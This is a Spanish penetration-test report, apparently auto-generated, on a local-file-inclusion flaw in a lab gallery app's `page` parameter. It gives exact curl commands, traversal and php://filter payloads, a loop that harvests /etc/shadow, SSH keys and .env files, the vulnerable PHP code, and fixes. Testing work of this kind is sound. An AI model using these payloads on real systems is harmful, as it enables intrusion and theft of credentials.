# Informe de auditoría LFI — Galería de Arte Virtual

Fecha: 2026-04-18T08:22:40Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
- Parámetro vulnerable: `page` en `gallery.php`
- Hallazgo: LFI confirmado — se pudo leer /etc/passwd desde la aplicación.
- Explotación: Se obtuvo también el código fuente de `gallery.php` usando el wrapper `php://filter`, lo que facilita hallar y explotar más problemas.

Estado
------
VULN_FOUND: true
VULN_EXPLOITED: true

Evidencia y pasos realizados
----------------------------
1) Reconocimiento inicial
- Petición inicial para identificar parámetros dinámicos (curl):
  - curl -s -D /tmp/headers_http.txt -o /tmp/body_http.txt http://web.dev.local:8081
- Resultado: la página incluye enlaces a `gallery.php?page=...`.

2) Fuzzing / pruebas LFI (comandos exactos usados)
- Pruebas manuales con curl (muestro ejemplos usados):
  - curl -s -G "http://web.dev.local:8081/gallery.php" --data-urlencode "page=../../../../../../etc/passwd"
  - curl -s -G "http://web.dev.local:8081/gallery.php" --data-urlencode "page=../../../../etc/passwd"
  - curl -s -G "http://web.dev.local:8081/gallery.php" --data-urlencode "page=/etc/passwd"
  - curl -s -G "http://web.dev.local:8081/gallery.php" --data-urlencode "page=php://filter/read=convert.base64-encode/resource=gallery.php"
  - También se probaron: proc/self/environ, /var/log/apache2/error.log, /var/log/apache2/access.log, /home/www-data/.ssh/id_rsa, /var/www/.env

3) Confirmación (lectura de ficheros)
- /etc/passwd leído correctamente. Fragmento obtenido (representativo):
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```
- Archivo `gallery.php` (fuente) obtenido mediante php://filter y decodificado localmente. Fragmentos relevantes:
  - El código obtiene `page` desde GET sin validación y construye un path:
```php
$page = $_GET['page'] ?? 'modern';
if (strpos($page, '.') !== false) {
    $file = $page;
} else {
    $file = "pages/" . $page . ".php";
}
if (file_exists($file)) include($file);
else { echo "Página no encontrada"; @include($file); }
```
- Observación: El código permite incluir rutas con extensión (`if (strpos($page, '.') !== false) { $file = $page; }`), lo que facilita LFI directo.

4) Intentos de escalada / ficheros adicionales
- Intentos para leer `/etc/shadow` y claves SSH devolvieron un mensaje «Página no encontrada» (la aplicación intentó buscar `pages//etc/shadow.php`), indicando que la inclusión fue tratada como ruta relativa en muchos casos.
- Sin embargo, lectura de `/etc/passwd` sí devolvió contenido: indica que la aplicación es capaz de acceder a rutas absolutas cuando se las pasa.
- php://filter permitió obtener la fuente PHP (una vía para buscar credenciales o más líneas vulnerables).

Payloads relevantes
------------------
- ../../../../../../etc/passwd
- ../../../../etc/passwd
- /etc/passwd
- php://filter/read=convert.base64-encode/resource=gallery.php
- ../../../../../../proc/self/environ
- ../../../../../../var/log/apache2/error.log

Impacto
-------
- Información expuesta: listado de usuarios del sistema (p. ej. `www-data`, `root`) — permite focalizar siguientes pasos de escalada.
- Código fuente recuperado facilita identificar rutas, includes y eventualmente credenciales en ficheros de configuración.
- Con acceso a ficheros de logs o posibilidad de log poisoning, podría derivarse en RCE (no se alcanzó RCE en esta sesión).

Recomendaciones
---------------
1. Validar/normalizar el parámetro `page` y NO permitir inclusiones arbitrarias. Usar una lista blanca de páginas permitidas (p. ej. modern, classic, abstract, about).
2. Evitar incluir archivos directamente desde datos controlados por el usuario. Usar mapeos seguros: $whitelist = ['modern' => 'pages/modern.php', ...];
3. Desactivar wrappers peligrosos y minimizar información de errores en producción.
4. Asegurar permisos de fichero: evitar que el usuario web pueda leer archivos sensibles. Revisar owner/permission de /etc/shadow, claves privadas y .env.
5. Monitorizar y revisar logs para detectar abuso.

Ficheros y comandos de trabajo (ubicaciones locales en el auditor)
---------------------------------------------------------------
- Resultados guardados en: /tmp/lfi_results/
- Comandos ejecutados (resumen):
  - curl -s -G "http://web.dev.local:8081/gallery.php" --data-urlencode "page=../../../../../../etc/passwd"
  - curl -s -G "http://web.dev.local:8081/gallery.php" --data-urlencode "page=php://filter/read=convert.base64-encode/resource=gallery.php"
  - Script de recolección: (usado internamente para múltiples targets)
    mkdir -p /tmp/lfi_results && for t in "php://filter/read=convert.base64-encode/resource=gallery.php" "../../../../../../etc/shadow" "/etc/shadow" "/var/www/.env" "/home/www-data/.ssh/id_rsa" "../../../../../../proc/self/environ"; do safe=$(echo "$t" | sed 's/[^A-Za-z0-9._-]/_/g'); curl -s -G --data-urlencode "page=$t" "http://web.dev.local:8081/gallery.php" -o /tmp/lfi_results/${safe}.html; done

Conclusión
----------
Se confirma la vulnerabilidad LFI en `gallery.php?page`. Se logró leer `/etc/passwd` (información sensible del sistema) y se obtuvo el código fuente de `gallery.php` mediante `php://filter`, por lo que la explotación fue exitosa.

---

Archivo generado automáticamente por el auditor (Kali-like tooling) — guardar este informe en el repositorio local para seguimiento.
